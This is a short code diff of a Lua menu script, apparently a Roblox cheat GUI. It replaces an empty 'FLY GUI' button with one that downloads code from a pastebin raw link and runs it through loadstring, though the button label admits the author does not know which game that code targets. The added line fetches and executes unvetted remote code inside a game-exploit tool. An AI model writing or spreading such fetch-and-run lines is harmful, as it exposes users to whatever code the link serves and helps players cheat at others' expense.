@@ -24,8 +24,8 @@ for i = 1, 16 do
         end)
 
 -- Create Button
-        Tab:CreateButton(" FLY GUI UNIVERSEAL", function()
-            
+        Tab:CreateButton("JUANKO DON'T KNOW WHICH GAME", function()
+loadstring(game:HttpGet("https://pastebin.com/raw/tcTds0ky"))()
         end)
 
         -- Create Toggle
